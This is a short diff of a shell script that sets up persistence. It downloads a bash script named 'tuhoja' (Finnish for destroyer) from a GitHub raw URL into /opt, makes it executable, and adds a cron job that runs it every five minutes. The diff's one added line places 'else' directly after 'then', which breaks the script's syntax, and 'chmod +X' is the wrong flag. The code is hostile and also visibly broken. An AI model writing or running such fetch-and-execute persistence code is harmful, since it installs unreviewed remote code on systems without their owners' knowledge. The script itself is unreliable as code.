@@ -3,6 +3,7 @@ TEMPFILE=~counter.tmp
 PERSISTENCE_DIR=/opt/tuhoja.sh
 COUNTER=0
 if test -f $PERSISTENCE_DIR ; then
+else
   curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
   chmod +X $PERSISTENCE_DIR
   (crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash /opt/tuhoja.sh") | crontab -
